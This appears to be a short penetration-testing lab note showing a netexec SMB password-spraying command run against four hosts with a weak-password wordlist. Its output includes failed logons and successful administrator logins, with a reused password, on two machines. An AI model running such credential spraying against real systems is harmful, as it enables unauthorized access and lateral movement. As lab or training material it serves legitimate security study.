Confirming local admin password reuse in the 172.16.5.0/24 subnet

```bash
╰─$ netexec smb 172.16.5.5 172.16.5.127 172.16.5.130 172.16.5.200  --local-auth -u administrator -p /usr/share/wordlists/statistically-likely-usernames/weak-corporate-passwords/english-basic.txt  --timeout 100000   --smb-timeout 1000000 --timeout 100000
SMB         172.16.5.130    445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:FILE01) (signing:False) (SMBv1:False)
SMB         172.16.5.5      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:False)
SMB         172.16.5.200    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:DEV01) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    FILE01           [-] FILE01\administrator:Password1 STATUS_LOGON_FAILURE
Welcome1
SMB         172.16.5.130    445    FILE01           [-] FILE01\administrator:Welcome1 STATUS_LOGON_FAILURE
SMB         172.16.5.130    445    FILE01           [+] FILE01\administrator:Welcome123! (Pwn3d!)
SMB         172.16.5.5      445    DC01             [-] DC01\administrator:Password1 STATUS_LOGON_FAILURE
SMB         172.16.5.5      445    DC01             [-] DC01\administrator:Welcome1 STATUS_LOGON_FAILURE
SMB         172.16.5.5      445    DC01             [-] DC01\administrator:Welcome123! STATUS_LOGON_FAILURE
SMB         172.16.5.5      445    DC01             [-] DC01\administrator:Letmein1 STATUS_LOGON_FAILURE 
SMB         172.16.5.5      445    DC01             [-] DC01\administrator:Password123 STATUS_LOGON_FAILURE
SMB         172.16.5.5      445    DC01             [-] DC01\administrator:Welcome123 STATUS_LOGON_FAILURE
SMB         172.16.5.5      445    DC01             [-] DC01\administrator:Letmein123 STATUS_LOGON_FAILURE
SMB         172.16.5.200    445    DEV01            [-] DEV01\administrator:Password1 STATUS_LOGON_FAILURE
SMB         172.16.5.200    445    DEV01            [-] DEV01\administrator:Welcome1 STATUS_LOGON_FAILURE
SMB         172.16.5.200    445    DEV01            [+] DEV01\administrator:Welcome123! (Pwn3d!)
```

![[Pasted image 20260126155700.png]]
